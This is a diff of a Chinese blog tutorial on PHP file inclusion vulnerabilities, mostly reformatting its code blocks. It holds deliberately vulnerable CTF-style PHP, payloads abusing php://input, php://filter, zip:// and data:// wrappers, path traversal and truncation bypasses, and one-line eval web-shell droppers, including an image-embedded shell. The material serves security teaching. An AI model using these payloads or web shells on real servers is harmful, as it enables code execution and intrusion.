@@ -102,15 +102,59 @@
 </ul>
 <h2 id="0x04-PHP伪协议"><a href="#0x04-PHP伪协议" class="headerlink" title="0x04  PHP伪协议"></a>0x04  PHP伪协议</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
 <h3 id="一、php-input"><a href="#一、php-input" class="headerlink" title="一、php://input"></a>一、php://input</h3><p><strong>php://input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212171710961.png" alt="在这里插入图片描述"></p>
-<p><strong>Example 1：</strong> 造成任意代码执行<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">"php://filter"</span>) || stristr($file,<span class="string">"zip://"</span>) || stristr($file,<span class="string">"phar://"</span>) || stristr($file,<span class="string">"data:"</span>))&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line">	<span class="keyword">if</span> ($file!=<span class="string">"http://www.baidu.com"</span>) <span class="keyword">echo</span> <span class="string">"tips：flag在当前目录的某个文件中"</span>;</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;a href="?file=http://www.baidu.com"&gt;click go baidu&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>Example 1：</strong> 造成任意代码执行</p>
+<pre><code class="php">&lt;meta charset=&quot;utf8&quot;&gt;
+&lt;?php
+error_reporting(0);
+$file = $_GET[&quot;file&quot;];
+if(stristr($file,&quot;php://filter&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;)){
+    exit(&#39;hacker!&#39;);
+}
+if($file){
+    if ($file!=&quot;http://www.baidu.com&quot;) echo &quot;tips：flag在当前目录的某个文件中&quot;;
+    include($file);
+}else{
+    echo &#39;&lt;a href=&quot;?file=http://www.baidu.com&quot;&gt;click go baidu&lt;/a&gt;&#39;;
+}
+?&gt;
+</code></pre>
 <p><img src="/2019/02/13/文件包含漏洞总结/20190212171849262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212172017164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212185213880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注：利用php://input还可以写入php木马,即在post中传入如下代码：</p>
-<pre><code>&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[cmd])?&gt;&apos;);?&gt;
-</code></pre><p><strong>Example 2：</strong> 文件内容绕过<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">$a= $_GET[<span class="string">"a"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a)&amp;&amp;(file_get_contents($a,<span class="string">'r'</span>)) === <span class="string">'I want flag'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"success\n"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">'flag&#123;flag_is_here&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;
+</code></pre><p><strong>Example 2：</strong> 文件内容绕过</p>
+<pre><code class="php">//test.php
+&lt;?php
+show_source(__FILE__);
+include(&#39;flag.php&#39;);
+$a= $_GET[&quot;a&quot;];
+if(isset($a)&amp;&amp;(file_get_contents($a,&#39;r&#39;)) === &#39;I want flag&#39;){
+    echo &quot;success\n&quot;;
+    echo $flag;
+}
+
+//flag.php
+&lt;?php
+$flag = &#39;flag{flag_is_here}&#39;;
+?&gt;
+</code></pre>
 <p>审计test.php知，当参数\$a不为空，且读取的文件中包含’I want flag’时，即可显示\$flag。所以可以使用php://input得到原始的post数据,访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行来进行绕过。<br>注：遇到file_get_contents()要想到用php://input绕过。</p>
 <p><img src="/2019/02/13/文件包含漏洞总结/20190212173415247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="二、php-filter"><a href="#二、php-filter" class="headerlink" title="二、php://filter"></a>二、php://filter</h3><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。<br><img src="/2019/02/13/文件包含漏洞总结/20190212181216425.png" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212181226147.png" alt="在这里插入图片描述"><br>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</p>
 <p>注：更多php://filter用法可参考：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
-<p><strong>Example 1：</strong><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">"php://input"</span>) || stristr($file,<span class="string">"zip://"</span>) || stristr($file,<span class="string">"phar://"</span>) || stristr($file,<span class="string">"data:"</span>))&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>Example 1：</strong></p>
+<pre><code class="php">&lt;meta charset=&quot;utf8&quot;&gt;
+&lt;?php
+error_reporting(0);
+$file = $_GET[&quot;file&quot;];
+if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;)){
+    exit(&#39;hacker!&#39;);
+}
+if($file){
+    include($file);
+}else{
+    echo &#39;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#39;;
+}
+?&gt;
+</code></pre>
 <p>1.点击tip后进入如下页面，看到url中出现‘file=flag.php’，如下：<br><img src="/2019/02/13/文件包含漏洞总结/20190212181928339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.尝试payload：?php://filter/resource=flag.php，发现无法显示内容：<br><img src="/2019/02/13/文件包含漏洞总结/20190212182033920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.尝试payload：?php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里：</p>
 <p><img src="/2019/02/13/文件包含漏洞总结/20190212182541177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="三、zip"><a href="#三、zip" class="headerlink" title="三、zip://"></a>三、zip://</h3><p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
@@ -118,10 +162,52 @@
 <li>zip://中只能传入绝对路径。</li>
 <li>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</li>
 <li>只需要是zip的压缩包即可，后缀名可以任意更改。</li>
-<li>相同的类型的还有zlib://和bzip2://<br><img src="/2019/02/13/文件包含漏洞总结/2019021218350876.png" alt="在这里插入图片描述"><br><strong>Example 1：</strong><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">&lt;meta charset=<span class="string">"utf8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span> (!$file) <span class="keyword">echo</span> <span class="string">'&lt;a href="?file=upload"&gt;upload?&lt;/a&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">"input"</span>)||stristr($file, <span class="string">"filter"</span>)||stristr($file,<span class="string">"data"</span>)<span class="comment">/*||stristr($file,"phar")*/</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"hick?"</span>;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">include</span>($file.<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- flag在当前目录的某个文件中 --&gt;</span><br></pre></td></tr></table></figure>
+<li>相同的类型的还有zlib://和bzip2://<br><img src="/2019/02/13/文件包含漏洞总结/2019021218350876.png" alt="在这里插入图片描述"><br><strong>Example 1：</strong><pre><code class="php">//index.php
+&lt;meta charset=&quot;utf8&quot;&gt;
+&lt;?php
+error_reporting(0);
+$file = $_GET[&quot;file&quot;];
+if (!$file) echo &#39;&lt;a href=&quot;?file=upload&quot;&gt;upload?&lt;/a&gt;&#39;;
+if(stristr($file,&quot;input&quot;)||stristr($file, &quot;filter&quot;)||stristr($file,&quot;data&quot;)/*||stristr($file,&quot;phar&quot;)*/){
+  echo &quot;hick?&quot;;
+  exit();
+}else{
+  include($file.&quot;.php&quot;);
+}
+?&gt;
+&lt;!-- flag在当前目录的某个文件中 --&gt;
+</code></pre>
+<pre><code class="php">//upload.php
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;
+   &lt;input type=&quot;file&quot; name=&quot;fupload&quot; /&gt;
+   &lt;input type=&quot;submit&quot; value=&quot;upload!&quot; /&gt;
+&lt;/form&gt;
+you can upload jpg,png,zip....&lt;br /&gt;
+&lt;?php
+if( isset( $_FILES[&#39;fupload&#39;] ) ) {
+  $uploaded_name = $_FILES[ &#39;fupload&#39; ][ &#39;name&#39; ];         //文件名
+  $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);   //文件后缀
+  $uploaded_size = $_FILES[ &#39;fupload&#39; ][ &#39;size&#39; ];         //文件大小
+  $uploaded_tmp  = $_FILES[ &#39;fupload&#39; ][ &#39;tmp_name&#39; ];     // 存储在服务器的文件的临时副本的名称
+  $target_path = &quot;uploads\\&quot;.md5(uniqid(rand())).&quot;.&quot;.$uploaded_ext;
+  if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; || strtolower( $uploaded_ext ) == &quot;zip&quot; ) &amp;&amp;
+      ( $uploaded_size &lt; 100000 ) ) {
+      if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {// No
+          echo &#39;&lt;pre&gt;upload error&lt;/pre&gt;&#39;;
+      }
+      else {// Yes!
+          echo &quot;&lt;pre&gt;&quot;.dirname(__FILE__).&quot;\\{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;
+      }
+  }
+  else {
+      echo &#39;&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;&#39;;
+  }
+}
+?&gt;
+</code></pre>
 </li>
 </ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//upload.php</span></span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">"upload.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> &gt;</span><br><span class="line">	 &lt;input type=<span class="string">"file"</span> name=<span class="string">"fupload"</span> /&gt;</span><br><span class="line"> 	&lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload!"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">you can upload jpg,png,zip....&lt;br /&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_FILES[<span class="string">'fupload'</span>] ) ) &#123;</span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'fupload'</span> ][ <span class="string">'name'</span> ];         <span class="comment">//文件名</span></span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);   <span class="comment">//文件后缀</span></span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'fupload'</span> ][ <span class="string">'size'</span> ];         <span class="comment">//文件大小</span></span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'fupload'</span> ][ <span class="string">'tmp_name'</span> ];     <span class="comment">// 存储在服务器的文件的临时副本的名称</span></span><br><span class="line">    $target_path = <span class="string">"uploads\\"</span>.md5(uniqid(rand())).<span class="string">"."</span>.$uploaded_ext;</span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> || strtolower( $uploaded_ext ) == <span class="string">"zip"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;<span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;upload error&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;<span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>.dirname(<span class="keyword">__FILE__</span>).<span class="string">"\\&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h3 id="四、data-与phar"><a href="#四、data-与phar" class="headerlink" title="四、data://与phar://"></a>四、data://与phar://</h3><p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212184105566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><strong>phar://</strong> 有点类似zip://同样可以导致 任意代码执行。</p>
 <ul>
@@ -155,18 +241,32 @@
 <p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考<a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="noopener">LFI With PHPInfo Assistance</a></p>
 <p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup</a><br><br></p>
 <h2 id="0x08-包含上传文件"><a href="#0x08-包含上传文件" class="headerlink" title="0x08 包含上传文件"></a>0x08 包含上传文件</h2><p>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</p>
-<p>图片马的制作方式如下，在cmd控制台下输入：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入1.jph和2.php的文件目录后，执行：</span><br><span class="line"></span><br><span class="line">copy  1.jpg/b+2.php  3.jpg</span><br><span class="line"></span><br><span class="line">将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg</span><br></pre></td></tr></table></figure></p>
-<p>假设已经上传一句话图片木马到服务器，路径为<code>/upload/201811.jpg</code><br>图片代码如下：</p>
-<pre><code>&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&apos;pass&apos;]);?&gt;&quot;)?&gt;
+<p>图片马的制作方式如下，在cmd控制台下输入：</p>
+<pre><code>进入1.jph和2.php的文件目录后，执行：
+
+copy  1.jpg/b+2.php  3.jpg
+
+将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg
+</code></pre><p>假设已经上传一句话图片木马到服务器，路径为<code>/upload/201811.jpg</code><br>图片代码如下：</p>
+<pre><code>&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&quot;)?&gt;
 </code></pre><p>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/201811.jpg</code>，包含这张图片，将会在<code>index.php</code>所在的目录下生成<code>shell.php</code><br><br></p>
 <h2 id="0x09-其他包含姿势"><a href="#0x09-其他包含姿势" class="headerlink" title="0x09 其他包含姿势"></a>0x09 其他包含姿势</h2><ul>
 <li>包含SMTP(日志)</li>
 <li>包含xss<br><br><br><br></li>
 </ul>
 <h1 id="文件包含漏洞的绕过方法"><a href="#文件包含漏洞的绕过方法" class="headerlink" title="文件包含漏洞的绕过方法"></a>文件包含漏洞的绕过方法</h1><p><br></p>
-<h2 id="0x09-指定前缀绕过"><a href="#0x09-指定前缀绕过" class="headerlink" title="0x09 指定前缀绕过"></a>0x09 指定前缀绕过</h2><h3 id="一、目录遍历"><a href="#一、目录遍历" class="headerlink" title="一、目录遍历"></a>一、目录遍历</h3><p>使用 ../../ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=../../phpinfo/phpinfo.php<br>测试代码如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">	<span class="comment">//前缀</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">"/var/www/html/"</span>.$file;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x09-指定前缀绕过"><a href="#0x09-指定前缀绕过" class="headerlink" title="0x09 指定前缀绕过"></a>0x09 指定前缀绕过</h2><h3 id="一、目录遍历"><a href="#一、目录遍历" class="headerlink" title="一、目录遍历"></a>一、目录遍历</h3><p>使用 ../../ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=../../phpinfo/phpinfo.php<br>测试代码如下：</p>
+<pre><code class="php">&lt;?php
+    error_reporting(0);
+    $file = $_GET[&quot;file&quot;];
+    //前缀
+    include &quot;/var/www/html/&quot;.$file;
+
+    highlight_file(__FILE__);
+?&gt;
+</code></pre>
 <p>现在在/var/log目录下有文件flag.txt，则利用../可以进行目录遍历，比如我们尝试访问：</p>
-<pre><code>include.php?file=../../log/flag.txt
+<pre><code> include.php?file=../../log/flag.txt
 </code></pre><p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，即 /var/log/flag.txt，从而包含成功。</p>
 <h3 id="二、编码绕过"><a href="#二、编码绕过" class="headerlink" title="二、编码绕过"></a>二、编码绕过</h3><p>服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。<br><strong>1.利用url编码</strong></p>
 <ul>
@@ -219,7 +319,16 @@
 </li>
 </ul>
 <p><br></p>
-<h2 id="0x10-指定后缀绕过"><a href="#0x10-指定后缀绕过" class="headerlink" title="0x10 指定后缀绕过"></a>0x10 指定后缀绕过</h2><p>后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">	<span class="comment">//后缀</span></span><br><span class="line">	<span class="keyword">include</span> $file.<span class="string">".txt"</span>;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x10-指定后缀绕过"><a href="#0x10-指定后缀绕过" class="headerlink" title="0x10 指定后缀绕过"></a>0x10 指定后缀绕过</h2><p>后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码：</p>
+<pre><code class="php">&lt;?php
+    error_reporting(0);
+    $file = $_GET[&quot;file&quot;];
+    //后缀
+    include $file.&quot;.txt&quot;;
+
+    highlight_file(__FILE__);
+?&gt;
+</code></pre>
 <h3 id="一、利用url"><a href="#一、利用url" class="headerlink" title="一、利用url"></a>一、利用url</h3><p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。<br>可参考此文章：<a href="https://www.jianshu.com/p/2c07fbb52b45" target="_blank" rel="noopener">URI’s fragment</a></p>
 <p>完整url格式：</p>
 <pre><code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment
@@ -261,7 +370,7 @@
 </ul>
 <ul>
 <li><p>只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)</p>
-<pre><code>?file=./././。。。省略。。。././shell.php
+<pre><code>  ?file=./././。。。省略。。。././shell.php
 </code></pre></li>
 </ul>
 <p>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</p>
@@ -273,7 +382,7 @@
 <p><strong>利用方法：</strong></p>
 <ul>
 <li><p>直接在文件名的最后加上%00来截断指定的后缀名</p>
-<pre><code>?file=shell.php%00
+<pre><code>  ?file=shell.php%00
 </code></pre></li>
 </ul>
 <p>注：现在用到%00阶段的情况已经不多了</p>
